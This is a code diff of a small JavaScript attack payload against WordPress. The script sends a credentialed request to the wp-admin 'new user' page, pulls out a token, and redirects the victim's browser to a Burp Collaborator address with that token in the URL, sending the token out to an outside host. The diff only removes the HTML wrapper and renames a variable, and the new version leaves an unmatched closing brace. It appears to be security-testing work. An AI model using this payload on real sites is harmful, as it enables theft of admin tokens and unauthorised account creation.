@@ -1,18 +1,6 @@
 
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Document</title>
-</head>
-<body>
-  <script>
-  
-function loadXMLDoc() {
-  var xhttp = new XMLHttpRequest();
-  xhttp.onreadystatechange = function() {
+var csrf = new XMLHttpRequest();
+  csrf.onreadystatechange = function() {
     if (this.readyState == 4 && this.status == 200) {
       const parser = new DOMParser();
       const htmlDocument = parser.parseFromString(this.responseText, "text/html");
@@ -20,12 +8,10 @@ function loadXMLDoc() {
       window.location = `http://e1gjugasquv15kb1v024p4gwsnydm2.burpcollaborator.net/?data=${token}`
     }
   };
-  xhttp.withCredentials = true
-  xhttp.open("GET", "http://localhost/arash/wp-admin/user-new.php", true);
-  xhttp.send();
+  csrf.withCredentials = true
+  csrf.open("GET", "http://localhost/arash/wp-admin/user-new.php", true);
+  csrf.send();
 }
-loadXMLDoc();
-  </script>
-</body>
-</html>
+
+
 
